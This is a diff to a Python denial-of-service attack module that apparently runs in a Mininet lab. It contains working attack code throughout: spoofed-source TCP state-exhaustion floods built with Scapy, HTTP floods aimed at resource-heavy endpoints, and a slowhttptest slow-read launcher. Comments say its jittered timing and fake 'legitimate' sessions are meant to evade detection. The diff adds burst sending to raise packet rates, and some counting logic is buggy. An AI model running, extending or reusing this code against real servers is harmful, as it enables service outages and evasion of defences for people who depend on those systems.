@@ -14,7 +14,10 @@ import logging
 import subprocess
 import pathlib
 import signal
+import socket # Added for socket.timeout
 
+
+import uuid
 
 # Get the centralized attack logger
 attack_logger = logging.getLogger('attack_logger')
@@ -81,6 +84,7 @@ class PacketCrafter:
         ttl = random.randint(48, 128)
         packet = IP(src=src, dst=dst, ttl=ttl)/TCP(sport=sport, dport=dport, 
                                                    seq=seq, window=window, flags=flags)
+        attack_logger.debug(f"Crafted TCP packet: src={src}, dst={dst}, dport={dport}, flags={flags}, ttl={ttl}")
         return packet
     
     def craft_http_packet(self, src, dst, dport=80):
@@ -116,6 +120,7 @@ class PacketCrafter:
         
         # Combine with payload
         packet = base_packet/Raw(load=http_request.encode())
+        attack_logger.debug(f"Crafted HTTP packet: method={method}, path={path}, user_agent={user_agent}, host={dst}")
         return packet
 
 # ---- Advanced Attack Techniques ----
@@ -129,64 +134,114 @@ class AdvancedTechniques:
     
     
     
-    def tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=50, duration=5):
+    def tcp_state_exhaustion(self, dst, dport=80, num_packets_per_sec=50, duration=5, run_id="", attack_variant=""):
         """
         Advanced TCP state exhaustion attack that manipulates sequence numbers
         and window sizes to keep connections half-open but valid
         """
-        attack_logger.info(f"Starting TCP state exhaustion attack against {dst}:{dport} for {duration} seconds")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: TCP State Exhaustion - Target: {dst}:{dport}, Duration: {duration}s")
         
         # Track sequence numbers for more sophisticated sequence prediction
         seq_base = random.randint(1000000, 9000000)
         
         end_time = time.time() + duration
+        sent_packets = 0
+        received_packets = 0
+        rst_packets = 0
+        timeout_packets = 0
         packet_count = 0
+        start_time = time.time()
+        last_log_time = start_time
+        
+        # Burst mechanism parameters
+        burst_size = max(1, int(num_packets_per_sec / 10)) # Send 10% of target PPS in a burst
+        burst_interval = 0.1 # Time between bursts
+        
         while time.time() < end_time:
-            src = self.ip_rotator.get_random_ip()
-            sport = random.randint(1024, 65535)
-            seq = seq_base + (packet_count * 1024)
-            
-            # Sophisticated manipulation of TCP window size
-            window = random.randint(16384, 65535)
-            
-            # Send SYN packet to initiate connection
-            syn_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, 
-                                                 flags="S", seq=seq, window=window)
-            
-            # Send and wait for SYN-ACK
-            try:
-                attack_logger.debug(f"Attempting to send SYN packet from {src}:{sport} to {dst}:{dport}")
-                reply = sr1(syn_packet, timeout=0.1, verbose=1)
-                attack_logger.debug(f"SYN packet sent. Reply: {reply}")
+            for _ in range(burst_size):
+                if time.time() >= end_time:
+                    break
+                src = self.ip_rotator.get_random_ip()
+                sport = random.randint(1024, 65535)
+                seq = seq_base + (sent_packets * 1024)
                 
-                if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags & 0x12:  # SYN+ACK
-                    attack_logger.debug(f"Received SYN-ACK from {dst}:{dport}. Sending ACK.")
-                    # Extract server sequence number and acknowledge it
-                    server_seq = reply.getlayer(TCP).seq
-                    ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
-                                                         flags="A", seq=seq+1, 
-                                                         ack=server_seq+1, window=window)
-                    send(ack_packet, verbose=1)
-                    attack_logger.debug(f"ACK packet sent. Established half-open connection from {src}:{sport}")
-                    # After establishing connection, don't continue with data transfer
-                    # This keeps connection half-open, consuming resources on target
-                    attack_logger.info(f"Established half-open connection from {src}:{sport}")
-                else:
-                    attack_logger.debug(f"No SYN-ACK received or invalid reply for {src}:{sport}.")
-            except Exception as e:
-                attack_logger.warning(f"Error during TCP state exhaustion from {src}:{sport}: {e}")
-                pass
+                # Sophisticated manipulation of TCP window size
+                window = random.randint(16384, 65535)
+                
+                # Send SYN packet to initiate connection
+                syn_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, 
+                                                     flags="S", seq=seq, window=window)
+                
+                # Send and wait for SYN-ACK
+                sent_packets += 1
+                packet_count += 1 # Increment packet_count for every attempted send
+                try:
+                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Attempting to send SYN packet from {src}:{sport} to {dst}:{dport}")
+                    reply = sr1(syn_packet, timeout=1, verbose=0) # Increased timeout to 1 second
+                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] SYN packet sent. Reply: {reply}")
+                    
+                    if reply and reply.haslayer(TCP):
+                        received_packets += 1
+                        tcp_layer = reply.getlayer(TCP)
+                        if tcp_layer.flags & 0x12:  # SYN+ACK
+                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Received SYN-ACK from {dst}:{dport}. Sending ACK.")
+                            # Extract server sequence number and acknowledge it
+                            server_seq = tcp_layer.seq
+                            ack_packet = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport,
+                                                                 flags="A", seq=seq+1, 
+                                                                 ack=server_seq+1, window=window)
+                            send(ack_packet, verbose=0) # verbose=0 to reduce console output
+                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] ACK packet sent. Established half-open connection from {src}:{sport}")
+                            # After establishing connection, don't continue with data transfer
+                            # This keeps connection half-open, consuming resources on target
+                            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Established half-open connection from {src}:{sport}")
+                        elif tcp_layer.flags & 0x04: # RST flag
+                            rst_packets += 1
+                            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Received RST from {dst}:{dport} for {src}:{sport}. Connection reset by server.")
+                        else:
+                            attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] Received unexpected TCP flags: {tcp_layer.flags} for {src}:{sport}.")
+                    else:
+                        attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] No TCP reply or invalid reply for {src}:{sport}.")
+                except socket.timeout:
+                    timeout_packets += 1
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Timeout: No reply received for SYN from {src}:{sport} to {dst}:{dport}.")
+                except Exception as e:
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error during TCP state exhaustion from {src}:{sport}: {e}")
+                    pass
+                
+                packet_count += 1
             
-            packet_count += 1
+            current_time = time.time()
+            if current_time - last_log_time >= 1.0: # Log every second
+                elapsed_time = current_time - start_time
+                if elapsed_time > 0:
+                    current_pps = packet_count / elapsed_time
+                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Emission rate: {current_pps:.2f} packets/sec, Total sent = {packet_count}")
+                last_log_time = current_time
+            
             # Add jitter to avoid detection based on timing patterns
-            time.sleep(random.uniform(0.01, 0.05)) # Reduced sleep for more packets per second
+            time.sleep(random.uniform(burst_interval * 0.8, burst_interval * 1.2)) # Jittered sleep between bursts
+        
+        total_elapsed_time = time.time() - start_time
+        warning_message = None
+        if total_elapsed_time > 0:
+            average_pps = packet_count / total_elapsed_time
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack finished. Total packets sent = {packet_count}, Average rate = {average_pps:.2f} packets/sec.")
+            expected_packets = num_packets_per_sec * duration
+            if packet_count < (expected_packets * 0.5): # Warning if less than 50% of expected
+                warning_message = f"Low packet count ({packet_count}) for expected duration ({duration}s) and rate ({num_packets_per_sec} pps). Expected ~{expected_packets} packets."
+        else:
+            average_pps = 0
+            warning_message = "Attack duration too short or no packets sent."
+        
+        return {"total_sent": sent_packets, "total_received": received_packets, "total_rst": rst_packets, "total_timeout": timeout_packets, "average_rate": average_pps, "type": "packets", "warning_message": warning_message}
     
-    def distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=20, duration=5):
+    def distributed_application_layer_attack(self, dst, dport=80, num_requests_per_sec=20, duration=5, run_id="", attack_variant=""):
         """
         Advanced application layer attack that mimics legitimate HTTP traffic
         but targets resource-intensive endpoints
         """
-        attack_logger.info(f"Starting distributed application layer attack against {dst}:{dport} for {duration} seconds")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Distributed Application Layer - Target: {dst}:{dport}, Duration: {duration}s")
         
         # Resource-intensive endpoints that might cause server strain
         resource_heavy_paths = [
@@ -198,51 +253,103 @@ class AdvancedTechniques:
         ]
         
         end_time = time.time() + duration
-        request_count = 0
+        sent_requests = 0
+        successful_requests = 0
+        failed_requests = 0
+        timeout_requests = 0
+        start_time = time.time()
+        last_log_time = start_time
+        
+        # Burst mechanism parameters
+        burst_size = max(1, int(num_requests_per_sec / 10)) # Send 10% of target RPS in a burst
+        burst_interval = 0.1 # Time between bursts
+        
         while time.time() < end_time:
-            src = self.ip_rotator.get_random_ip()
-            
-            # Create base TCP connection
-            base_packet = self.packet_crafter.craft_tcp_packet(src, dst, dport)
-            
-            # Select a resource-heavy path
-            path = random.choice(resource_heavy_paths)
-            
-            # Choose random HTTP method
-            method = random.choice(self.packet_crafter.http_methods)
-
-            # Create HTTP request targeting resource-heavy endpoint
-            user_agent = random.choice(self.packet_crafter.user_agents)
-            headers = dict(self.packet_crafter.common_headers)
-            headers["User-Agent"] = user_agent
-            headers["Host"] = dst
-            
-            # Format HTTP request
-            http_request = f"{method} {path} HTTP/1.1\r\n"
-            for header, value in headers.items():
-                http_request += f"{header}: {value}\r\n"
-            
-            # Sometimes add cookies to appear more legitimate
-            if random.random() > 0.5:
-                http_request += f"Cookie: session_id={os.urandom(16).hex()}; user_pref=dark_mode\r\n"
+            for _ in range(burst_size):
+                if time.time() >= end_time:
+                    break
+                src = self.ip_rotator.get_random_ip()
                 
-            http_request += "\r\n"
+                # Select a resource-heavy path
+                path = random.choice(resource_heavy_paths)
+                
+                # Choose random HTTP method
+                method = random.choice(self.packet_crafter.http_methods)
+
+                # Create HTTP headers
+                user_agent = random.choice(self.packet_crafter.user_agents)
+                headers = dict(self.packet_crafter.common_headers)
+                headers["User-Agent"] = user_agent
+                headers["Host"] = dst
+                
+                # Sometimes add cookies to appear more legitimate
+                if random.random() > 0.5:
+                    headers["Cookie"] = f"session_id={os.urandom(16).hex()}; user_pref=dark_mode"
+                
+                session = requests.Session()
+                session.headers.update(headers)
+
+                sent_requests += 1
+                try:
+                    request_start_time = time.time()
+                    if method == "GET":
+                        response = session.get(f"http://{dst}:{dport}{path}", timeout=2)
+                    elif method == "POST":
+                        # For POST, include some dummy data
+                        data = {"param1": "value1", "param2": "value2"}
+                        response = session.post(f"http://{dst}:{dport}{path}", data=data, timeout=2)
+                    elif method == "HEAD":
+                        response = session.head(f"http://{dst}:{dport}{path}", timeout=2)
+                    elif method == "OPTIONS":
+                        response = session.options(f"http://{dst}:{dport}{path}", timeout=2)
+                    
+                    request_end_time = time.time()
+                    response_time = (request_end_time - request_start_time) * 1000 # in ms
+                    
+                    successful_requests += 1
+                    attack_logger.debug(f"[{attack_variant}] [Run ID: {run_id}] App Layer: {method} request to {dst}:{dport}{path} from {src} - Status: {response.status_code}, Time: {response_time:.2f}ms")
+                    
+                except requests.exceptions.Timeout:
+                    timeout_requests += 1
+                    failed_requests += 1
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Timeout for {method} request to {dst}:{dport}{path} from {src}")
+                except requests.exceptions.ConnectionError as e:
+                    failed_requests += 1
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Connection Error for {method} request to {dst}:{dport}{path} from {src}: {e}")
+                except Exception as e:
+                    failed_requests += 1
+                    attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] App Layer: Unexpected Error for {method} request to {dst}:{dport}{path} from {src}: {e}")
+                
+            current_time = time.time()
+            if current_time - last_log_time >= 1.0: # Log every second
+                elapsed_time = current_time - start_time
+                if elapsed_time > 0:
+                    current_rps = sent_requests / elapsed_time
+                    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Emission rate: {current_rps:.2f} requests/sec, Total sent = {sent_requests}, Successful = {successful_requests}, Failed = {failed_requests}")
+                last_log_time = current_time
             
-            # Send packet
-            packet = base_packet/Raw(load=http_request.encode())
-            attack_logger.debug(f"App Layer: Attempting to send {method} request from {src} to {dst}:{dport} for path {path}")
-            send(packet, verbose=1)
-            attack_logger.debug(f"App Layer: {method} request sent from {src} to {dst}:{dport}")
-            
-            request_count += 1
             # Variable timing to avoid detection
-            time.sleep(random.uniform(0.05, 0.1)) # Reduced sleep for more requests per second
+            time.sleep(random.uniform(burst_interval * 0.8, burst_interval * 1.2)) # Jittered sleep between bursts
+        
+        total_elapsed_time = time.time() - start_time
+        warning_message = None
+        if total_elapsed_time > 0:
+            average_rps = sent_requests / total_elapsed_time
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack finished. Total requests sent = {sent_requests}, Successful = {successful_requests}, Failed = {failed_requests}, Average rate = {average_rps:.2f} requests/sec.")
+            expected_requests = num_requests_per_sec * duration
+            if sent_requests < (expected_requests * 0.5): # Warning if less than 50% of expected
+                warning_message = f"Low request count ({sent_requests}) for expected duration ({duration}s) and rate ({num_requests_per_sec} rps). Expected ~{expected_requests} requests."
+        else:
+            average_rps = 0
+            warning_message = "Attack duration too short or no requests sent."
+        
+        return {"total_sent": sent_requests, "total_successful": successful_requests, "total_failed": failed_requests, "total_timeout": timeout_requests, "average_rate": average_rps, "type": "requests", "warning_message": warning_message}
     
     def multi_vector_attack(self, dst, duration=60):
         """
         Launch multiple attack vectors simultaneously to make detection harder
         """
-        attack_logger.info(f"Starting multi-vector attack against {dst} for {duration} seconds")
+        attack_logger.info(f"Attack Phase: Multi-Vector Attack - Target: {dst}, Duration: {duration}s")
         
         end_time = time.time() + duration
         
@@ -281,6 +388,8 @@ class AdvancedTechniques:
 
 # ---- Advanced Session Management ----
 
+import uuid
+
 class SessionMaintainer:
     """Maintains persistent sessions to appear legitimate"""
     
@@ -292,6 +401,7 @@ class SessionMaintainer:
     def create_session(self, target):
         """Create and maintain a legitimate looking session"""
         src_ip = self.ip_rotator.get_random_ip()
+        session_id = str(uuid.uuid4()) # Generate a unique session ID
         
         try:
             # Create an actual HTTP session
@@ -310,38 +420,39 @@ class SessionMaintainer:
             
             # Store the session info
             with self.lock:
-                self.sessions[src_ip] = {
+                self.sessions[session_id] = { # Use session_id as key
+                    'src_ip': src_ip,
                     'session': session,
                     'cookies': session.cookies,
                     'last_page': '/',
                     'created': time.time()
                 }
                 
-            logger.debug(f"Created legitimate session from {src_ip}")
-            return src_ip
+            attack_logger.debug(f"Session {session_id}: Created legitimate session from {src_ip}")
+            return session_id
         except Exception as e:
-            logger.debug(f"Failed to create session: {e}")
+            attack_logger.debug(f"Session {session_id}: Failed to create session from {src_ip}: {e}")
             return None
     
     def maintain_sessions(self, target, session_count=10, duration=300):
         """Create and maintain multiple legitimate-looking sessions"""
-        logger.info(f"Maintaining {session_count} legitimate sessions with {target}")
+        attack_logger.info(f"Maintaining {session_count} legitimate sessions with {target}")
         
         # Create initial sessions
-        active_sessions = []
+        active_session_ids = []
         for _ in range(session_count):
-            session_ip = self.create_session(target)
-            if session_ip:
-                active_sessions.append(session_ip)
+            session_id = self.create_session(target)
+            if session_id:
+                active_session_ids.append(session_id)
             time.sleep(random.uniform(1, 3))
         
         # Maintain sessions for duration
         end_time = time.time() + duration
         while time.time() < end_time:
             # Randomly select a session to interact with
-            if active_sessions:
-                session_ip = random.choice(active_sessions)
-                session_info = self.sessions.get(session_ip)
+            if active_session_ids:
+                session_id = random.choice(active_session_ids)
+                session_info = self.sessions.get(session_id)
                 
                 if session_info:
                     try:
@@ -364,24 +475,28 @@ class SessionMaintainer:
                             session_info['last_page'] = next_page
                             session_info['last_activity'] = time.time()
                         
-                        logger.debug(f"Session {session_ip} visited {next_page}")
+                        attack_logger.debug(f"Session {session_id}: Visited {next_page}")
                     except Exception as e:
                         # Handle failed request - might need to create new session
-                        logger.debug(f"Session interaction failed: {e}")
-                        active_sessions.remove(session_ip)
-                        new_ip = self.create_session(target)
-                        if new_ip:
-                            active_sessions.append(new_ip)
+                        attack_logger.debug(f"Session {session_id}: Interaction failed: {e}")
+                        active_session_ids.remove(session_id)
+                        # Clean up the failed session from self.sessions
+                        if session_id in self.sessions:
+                            with self.lock:
+                                del self.sessions[session_id]
+                        new_id = self.create_session(target)
+                        if new_id:
+                            active_session_ids.append(new_id)
             
             # Sleep between interactions
             time.sleep(random.uniform(5, 15))
         
         # Clean up sessions
-        logger.info("Cleaning up sessions")
-        for ip in active_sessions:
-            if ip in self.sessions:
+        attack_logger.info("Cleaning up sessions")
+        for session_id in active_session_ids:
+            if session_id in self.sessions:
                 with self.lock:
-                    del self.sessions[ip]
+                    del self.sessions[session_id]
 
 # ---- Monitoring and Adaptation ----
 
@@ -424,7 +539,7 @@ class AdaptiveController:
                 self.detected_countermeasures.add("timeout_defense")
             return None
         except Exception as e:
-            logger.debug(f"Probe error: {e}")
+            attack_logger.debug(f"Probe error: {e}")
             return None
     
     def get_average_response_time(self):
@@ -470,7 +585,7 @@ class AdaptiveController:
     
     def monitoring_loop(self, duration=300):
         """Continuously monitor target and update parameters"""
-        logger.info(f"Starting adaptive monitoring of {self.target} for {duration} seconds")
+        attack_logger.info(f"Starting adaptive monitoring of {self.target} for {duration} seconds")
         
         end_time = time.time() + duration
         while time.time() < end_time:
@@ -547,146 +662,130 @@ class AdvancedDDoSCoordinator:
         monitor_thread.join()
         session_thread.join()
         
-        attack_logger.info(f"Advanced DDoS attack completed")
+        attack_logger.info(f"Advanced DDoS attack completed. Total duration: {duration}s")
 
 # ---- Run everything ----
 
 def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", output_dir=None):
     from pathlib import Path
-    """
-    Main function to run a specific advanced adversarial attack.
-    attacker_host is not directly used here as IP rotation is handled internally.
-    """
+    import uuid # Import uuid for generating unique run IDs
+    
+    run_id = str(uuid.uuid4()) # Generate a unique ID for this attack run
     
     if output_dir:
         attack_log_file = Path(output_dir) / "attack.log"
         file_handler = logging.FileHandler(attack_log_file)
-        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
         attack_logger.addHandler(file_handler)
 
-    attack_logger.info(f"Starting advanced adversarial attack '{attack_variant}' against {victim_ip} for {duration} seconds.")
+    attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Starting advanced adversarial attack against {victim_ip} for {duration} seconds.")
     coordinator = AdvancedDDoSCoordinator(victim_ip)
 
+    attack_results = {} # Dictionary to store results for summary
+
     if attack_variant == "slow_read":
-        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
-    elif attack_variant == "ad_syn":
-        coordinator.advanced.tcp_state_exhaustion(victim_ip, duration=duration)
-    elif attack_variant == "ad_udp":
-        coordinator.advanced.distributed_application_layer_attack(victim_ip, duration=duration)
-    elif attack_variant == "ad_slow":
-        attack_logger.info(f"Starting slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} for {duration} seconds.")
-        # -c: number of connections, -H: Slowloris mode, -i: interval, -r: connections per second, -l: duration
-        # -u: URL, -t SR: Slow Read attack
+        # slow_read is handled by the coordinator's advanced.slow_read_attack, which is not yet implemented
+        # in the provided code snippet. Assuming it will be a direct call to slowhttptest.
+        # For now, we'll keep the existing slowhttptest execution logic.
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Adversarial Slow Read - Attacker: {attacker_host.name}, Target: {victim_ip}, Duration: {duration}s")
         slowhttptest_cmd = f"slowhttptest -c 100 -H -i 10 -r 20 -l {duration} -u http://{victim_ip}:80/ -t SR"
-        # Execute slowhttptest directly on the Mininet host
-        # Mininet's host.cmd method handles execution within the host's context
-        # and captures stdout/stderr.
-        attack_logger.info(f"Executing slowhttptest command: {slowhttptest_cmd}")
-        stdout, stderr = attacker_host.cmd(slowhttptest_cmd).strip().split('\n', 1)
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Executing slowhttptest command: {slowhttptest_cmd}")
         
-        # The above split might not work if stdout/stderr is empty or single line.
-        # Let's re-evaluate how to get stdout/stderr from host.cmd
-        # host.cmd returns a single string containing both stdout and stderr.
-        # We need to capture them separately if possible, or parse the output.
-        # For now, let's assume the output format is consistent.
-        # A better approach would be to use Popen directly on the host if more control is needed.
-        # However, for simplicity and Mininet integration, host.cmd is preferred.
-        
-        # Re-running with a more robust way to get stdout/stderr if host.cmd doesn't separate them.
-        # For now, let's just capture the full output and log it.
-        # If slowhttptest prints to stderr, it will be in the combined output.
-        
-        # Let's try to run it in background and then kill it after duration
-        # This requires more complex process management within Mininet.
-        # For now, let's stick to the simpler blocking call and rely on its internal duration.
-        
-        # The original code had a `time.sleep(duration)` and then tried to kill the process.
-        # `attacker_host.cmd` is blocking, so `time.sleep(duration)` is not needed after it.
-        # The `slowhttptest` command itself has a `-l` (duration) parameter, so it should exit on its own.
-        # We just need to capture its output.
-        
-        # Let's re-think the `attacker_host.cmd` output. It returns a single string.
-        # We need to parse it to distinguish stdout and stderr.
-        # This is often tricky with shell commands.
-        # A common pattern is to redirect stderr to stdout: `command 2>&1`
-        # But `slowhttptest` might print progress to stderr.
-        
-        # For now, let's assume `attacker_host.cmd` returns the combined output.
-        # The original code was trying to get separate stdout/stderr from `process.communicate()`.
-        # With `attacker_host.cmd`, we get a single string.
-        
-        # Let's modify the logging to reflect this.
-        full_output = attacker_host.cmd(slowhttptest_cmd)
-        stdout = full_output # Assuming all output is stdout for simplicity with host.cmd
-        stderr = "" # No separate stderr easily available with host.cmd
-        
-        # If slowhttptest has an error, it usually prints to stderr.
-        # We can check for common error patterns in `full_output` if needed.
-        
-        # The original code had a `try...except` for `send_signal`.
-        # With `attacker_host.cmd`, the command runs to completion or fails.
-        # No explicit signal sending is needed if `-l` is used.
-        
-        # Let's simplify the logging based on `full_output`.
-        attack_logger.info(f"slowhttptest output: {full_output.strip() if full_output else '(empty)'}")
-        # We can't easily distinguish stdout/stderr from host.cmd's single return string.
-        # So, we'll log the full output as 'output' and remove the separate stdout/stderr logging.
-        # If there's an error, it will be part of the 'output'.
-        
-        # The original code had `stdout, stderr = process.communicate()`.
-        # With `attacker_host.cmd`, we get the combined output.
-        # Let's just log the combined output.
-        
-        # Reverting to the original approach of using popen for better control over stdout/stderr
-        # and process management, but fixing the `shell=True` usage.
-        
-        # The issue with `attacker_host.popen([slowhttptest_cmd], shell=True)` is that
-        # when `shell=True`, the command should be a string, not a list.
-        # If it's a list, the first element is the command, and subsequent elements are arguments.
-        # But with `shell=True`, the entire string is passed to the shell.
-        
-        # Correct usage with `shell=True`:
-        # process = attacker_host.popen(slowhttptest_cmd, shell=True, ...)
-        
-        # Let's go with this corrected `popen` approach.
         process = attacker_host.popen(slowhttptest_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        
-        # Wait for the duration of the attack.
         time.sleep(duration)
         
-        # Attempt to stop slowhttptest gracefully.
         try:
-            # Check if the process is still running before sending signal
-            if process.poll() is None: # None means process is still running
+            if process.poll() is None:
                 process.send_signal(signal.SIGINT)
-                attack_logger.info(f"Sent SIGINT to slowhttptest process {process.pid}")
-                # Give it a moment to terminate gracefully
+                attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Sent SIGINT to slowhttptest process {process.pid}")
                 time.sleep(1) 
         except Exception as e:
-            attack_logger.warning(f"Error sending SIGINT to slowhttptest: {e}")
+            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error sending SIGINT to slowhttptest: {e}")
         
-        # If it's still running, terminate it.
         if process.poll() is None:
-            attack_logger.warning(f"slowhttptest process {process.pid} did not terminate gracefully, forcing termination.")
+            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process {process.pid} did not terminate gracefully, forcing termination.")
             process.terminate()
-            time.sleep(1) # Give it a moment to terminate
+            time.sleep(1)
         
-        # Get stdout and stderr
         stdout, stderr = process.communicate()
+        stdout_str = stdout.decode().strip()
+        stderr_str = stderr.decode().strip()
+
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- slowhttptest Summary ---")
         
-        attack_logger.info(f"slowhttptest stdout: {stdout.decode().strip() if stdout else '(empty)'}")
-        if stderr:
-            attack_logger.error(f"slowhttptest stderr: {stderr.decode().strip()}")
-        else:
-            attack_logger.debug(f"slowhttptest stderr: (empty)")
+        exit_status_match = re.search(r"Exit Status: (\d+)", stdout_str)
+        pending_match = re.search(r"pending connections:\s*(\d+)", stdout_str)
+        connected_match = re.search(r"connected connections:\s*(\d+)", stdout_str)
+        closed_match = re.search(r"closed connections:\s*(\d+)", stdout_str)
+        error_match = re.search(r"error connections:\s*(\d+)", stdout_str)
         
-        # Check the exit code of the process
+        if exit_status_match:
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Exit Status: {exit_status_match.group(1)}")
+        if pending_match:
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Pending Connections: {pending_match.group(1)}")
+        if connected_match:
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Connected Connections: {connected_match.group(1)}")
+        if closed_match:
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Closed Connections: {closed_match.group(1)}")
+        if error_match:
+            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Error Connections: {error_match.group(1)}")
+
+        # Calculate and log total connections attempted and successful connections
+        pending = int(pending_match.group(1)) if pending_match else 0
+        connected = int(connected_match.group(1)) if connected_match else 0
+        closed = int(closed_match.group(1)) if closed_match else 0
+        errors = int(error_match.group(1)) if error_match else 0
+        
+        total_connections_attempted = pending + connected + closed + errors
+        successful_connections = connected
+        
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total Connections Attempted: {total_connections_attempted}")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Successful Connections: {successful_connections}")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stdout: {stdout_str}")
+
+        if stderr_str:
+            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stderr: {stderr_str}")
+        
         exit_code = process.returncode
         if exit_code != 0:
-            attack_logger.error(f"slowhttptest process exited with non-zero code: {exit_code}")
-        attack_logger.info(f"slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
+            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process exited with non-zero code: {exit_code}")
+        
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------------")
+        attack_results[attack_variant] = {
+            "status": "completed",
+            "exit_code": exit_code,
+            "stdout_summary": {
+                "exit_status": exit_status_match.group(1) if exit_status_match else "N/A",
+                "pending": pending_match.group(1) if pending_match else "N/A",
+                "connected": connected_match.group(1) if connected_match else "N/A",
+                "closed": closed_match.group(1) if closed_match else "N/A",
+                "errors": error_match.group(1) if error_match else "N/A",
+                "total_attempted": total_connections_attempted,
+                "successful": successful_connections,
+            },
+            "stderr": stderr_str
+        }
         return process
+    elif attack_variant == "ad_syn":
+        results = coordinator.advanced.tcp_state_exhaustion(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
+        attack_results[attack_variant] = results
+    elif attack_variant == "ad_udp":
+        results = coordinator.advanced.distributed_application_layer_attack(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
+        attack_results[attack_variant] = results
     else:
-        attack_logger.warning(f"Unknown attack variant: {attack_variant}. Running slow_read by default.")
-        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
-        return None # No external process to manage
+        attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Unknown attack variant: {attack_variant}. No specific attack executed.")
+        attack_results[attack_variant] = {"status": "unknown_variant", "message": "No specific attack executed for this variant."}
+        return None
+    
+    # Final summary for ad_syn and ad_udp
+    if attack_variant in ["ad_syn", "ad_udp"] and attack_results.get(attack_variant):
+        summary = attack_results[attack_variant]
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- Attack Summary ---")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total {summary.get('type', 'packets/requests')} sent: {summary.get('total_sent', 0)}")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Average rate: {summary.get('average_rate', 0):.2f} {summary.get('type', 'packets/requests')}/sec")
+        if summary.get('warning_message'):
+            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Warning: {summary['warning_message']}")
+        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------")
+    
+    return None # For ad_syn and ad_udp, no direct process to return
